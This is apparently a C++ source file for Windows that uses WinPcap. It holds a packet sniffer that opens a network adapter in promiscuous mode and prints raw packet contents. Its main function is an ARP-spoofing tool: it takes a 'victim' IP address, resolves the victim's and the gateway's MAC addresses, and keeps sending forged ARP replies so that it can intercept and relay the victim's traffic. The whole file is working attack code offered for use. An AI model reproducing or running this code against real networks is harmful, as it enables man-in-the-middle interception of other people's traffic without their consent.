#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define HAVE_REMOTE

#include "arpspoof.h"

void capture();
bool testTargetNetwork(pcap_if_t * adapter);
// http://www.troliver.com/?p=335



pcap_if_t			*	allAdapters;		//Used to store all the adapters in a list (by storing references to next adapters)
pcap_if_t			*	adapter;			//Used to store one of the adapters in a list.
pcap_t				*	captureInstance;	//Used to store a capture
struct pcap_pkthdr	*	packetHeader;		//Used to store the header for a packet
const u_char		*	packetData;			//Used to store the packet's data

char errorBuffer[PCAP_ERRBUF_SIZE];

int func(char *packet_filter)
{
	pcap_findalldevs_ex((char *)PCAP_SRC_IF_STRING, NULL, &allAdapters, errorBuffer);


	int totalAdapters = 0;

	for (adapter = allAdapters; adapter; adapter = adapter->next)
	{
		printf("\n%d %s) ", ++totalAdapters, adapter->name);
		printf("-- %s\n", adapter->description);
	}
	//Just add a blank line. Makes it look pretty.
	printf("\n");


	int selectedAdapterNumber = 0;

	for (adapter = allAdapters; adapter; adapter = adapter->next)
	{
		++selectedAdapterNumber;
		if (testTargetNetwork(adapter))
		{
			printf("\nComputer is currently attached to the network through adapter %d", selectedAdapterNumber);
			printf("\n");
		}
	}

	adapter = allAdapters;
	for (int i = 0; i < selectedAdapterNumber - 1; i++)
	{
		adapter = adapter->next;
	}



	captureInstance = pcap_open(adapter->name, 65535, PCAP_OPENFLAG_PROMISCUOUS, 65000, NULL, errorBuffer);

	struct bpf_program fcode;
	pcap_compile(captureInstance, &fcode, packet_filter, 1, ((struct sockaddr_in *)(adapter->addresses->netmask))->sin_addr.S_un.S_addr);
	pcap_setfilter(captureInstance, &fcode);




	capture();


	system("PAUSE");
	return 0;
}

//This is what we use to compare the interfaces against our network identity.
bool testTargetNetwork(pcap_if_t * adapter)
{
	char ipAddress[INET6_ADDRSTRLEN];
	pcap_addr_t * adapterAddress;

	for (adapterAddress = adapter->addresses; adapterAddress; adapterAddress = adapterAddress->next)
	{
		if (adapterAddress->addr->sa_family == AF_INET)
		{
			inet_ntop(adapterAddress->addr->sa_family,
				&(((struct sockaddr_in*)adapterAddress->addr)->sin_addr),
				ipAddress,
				sizeof(ipAddress));
		}
	}

	int hundreds;
	int tens;
	int units;

	if (ipAddress[2] == '.')
	{
		hundreds = (ipAddress[0] - '0') * 10;
		tens = (ipAddress[1] - '0') * 1;
		units = 0;
	}
	else
	{
		hundreds = (ipAddress[0] - '0') * 100;
		tens = (ipAddress[1] - '0') * 10;
		units = (ipAddress[2] - '0') * 1;
	}

	int temp4 = hundreds + tens + units;
	int network = 10;
	return (temp4 == network);
}

//Capture code
void capture()
{
	pcap_freealldevs(allAdapters);


	printf("\nCapture session started (%s)\n", adapter->name);


	int packetFound;
	while ((packetFound = pcap_next_ex(captureInstance, &packetHeader, &packetData)) >= 0)
	{
		if (packetFound == 0)
		{
			printf("\nPacket timed out! Trying again..");
			continue;
		}


		printf("\n%d:%d:%d length of packet: %d\n", (packetHeader->ts.tv_sec % 86400) / 3600, (packetHeader->ts.tv_sec % 3600) / 60, packetHeader->ts.tv_sec % 60, packetHeader->len);

		printf("\n");

		for (int x = 0; x < packetHeader->len; x++)
		{
			if ((packetData[x] == 0x0e) || (packetData[x] == '\0'))
			{
				printf("\n");
			}
			else
			{
				printf("%c", packetData[x]);
			}
		}
		//Stop iterating and exit
		break;
	}
}






Arpspoof a;

BOOL WINAPI CtrlCHandler(DWORD dwCtrlType) {
	if (dwCtrlType == CTRL_C_EVENT) {
		a.stop = true;
		return TRUE;
	}
	return FALSE;
}

int main(int argc, char **argv)
{
	std::string victim(argv[1]);
	std::string target;
	uint8_t victimip[4], targetip[4] = { 0 };
	{
		uint32_t a = inet_addr(victim.c_str());
		memcpy(victimip, &a, 4);
	}

	std::string ifacestr;
	std::vector<iface_info> ifaces = a.find_ifaces();
	int ifaceidx = -1;
	if (ifacestr.empty()) {
		// Find iface with address/netmask matching given victim
		int i = 0;
		for (const iface_info& iface : ifaces) {
			uint32_t ip = (iface.ip[0] << 24) | (iface.ip[1] << 16) | (iface.ip[2] << 8) | iface.ip[3];
			uint32_t ipnet = ip & ~((1 << (32 - iface.prefixlen)) - 1);
			uint32_t vic = (victimip[0] << 24) | (victimip[1] << 16) | (victimip[2] << 8) | victimip[3];
			uint32_t vicnet = vic & ~((1 << (32 - iface.prefixlen)) - 1);
			if (ip != 0 && ipnet == vicnet) {
				if (ifaceidx == -1) {
					ifaceidx = i;
				}
				else {
					fprintf(stderr, "Several interfaces match victim IP, use -i");
					return 1;
				}
			}
			i++;
		}
	}
	else {
		// ifacestr is interface index or name
		int index = atoi(ifacestr.c_str());
		if (index == 0) {
			int i = 0;
			for (const iface_info& iface : ifaces) {
				if (iface.name == ifacestr) {
					ifaceidx = i;
					break;
				}
				i++;
			}
		}
		else {
			ifaceidx = index;
		}
	}
	if (ifaceidx < 0 || ifaceidx >= (int)ifaces.size()) {
		fprintf(stderr, "Can't find interface (explicitly specified or matching victim IP)\n");
		return 1;
	}
	const iface_info& iface = ifaces[ifaceidx];
	if (target.empty()) {
		memcpy(targetip, iface.gateway, 4);
	}

	printf("Resolving victim and target...\n");

	uint8_t victimmac[6], targetmac[6];
	if (!a.resolve(iface, victimip, victimmac)) {
		fprintf(stderr, "Can't resolve victim IP, is it up?\n");
		return 1;
	}
	if (!a.resolve(iface, targetip, targetmac)) {
		fprintf(stderr, "Can't resolve target IP, is it up?\n");
		return 1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *pcap = pcap_open_live(iface.name.c_str(),		// name of the device
		65536,			// snaplen
		1,				// promiscuous mode (nonzero means promiscuous)
		1000,			// read timeout
		errbuf			// error buffer
	);
	if (pcap == NULL) {
		fprintf(stderr, "Unable to open the adapter. %s is not supported by WinPcap\n", iface.name.c_str());
		return 1;
	}
	/* Check the link layer. We support only Ethernet for simplicity. */
	if (pcap_datalink(pcap) != DLT_EN10MB)
	{
		fprintf(stderr, "This program works only on Ethernet networks.\n");
		return 1;
	}

	SetConsoleCtrlHandler(CtrlCHandler, TRUE);

	uint8_t arp_spoof_victim[42], arp_spoof_target[42];
	a.fill_arp_packet(arp_spoof_victim, victimip, victimmac, targetip, iface.mac);
	a.fill_arp_packet(arp_spoof_target, targetip, targetmac, victimip, iface.mac);

	printf("Redirecting %s (%s) ---> %s (%s)\n", a.ip_to_str(victimip).c_str(), a.mac_to_str(victimmac).c_str(),
		a.ip_to_str(targetip).c_str(), a.mac_to_str(targetmac).c_str());

	time_t next_arp_time = 0;
	while (!a.stop) {
		time_t now = time(nullptr);
		if (now >= next_arp_time) {
			next_arp_time = now + 2;
			if (pcap_sendpacket(pcap, arp_spoof_victim, sizeof(arp_spoof_victim)) != 0) {
				fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(pcap));
				return 1;
			}
			if (pcap_sendpacket(pcap, arp_spoof_target, sizeof(arp_spoof_target)) != 0) {
				fprintf(stderr, "Error sending packet2: %s\n", pcap_geterr(pcap));
				return 1;
			}
		}

		pcap_pkthdr *header;
		const uint8_t *pkt_data;
		int res = pcap_next_ex(pcap, &header, &pkt_data);
		if (res < 0) {
			printf("error\n");
			break;
		}
		else if (res == 0) {
			// timeout
			continue;
		}
		a.handle_packet(pcap, header, pkt_data, victimmac, victimip, targetmac, iface.mac);
	}

	return 0;
}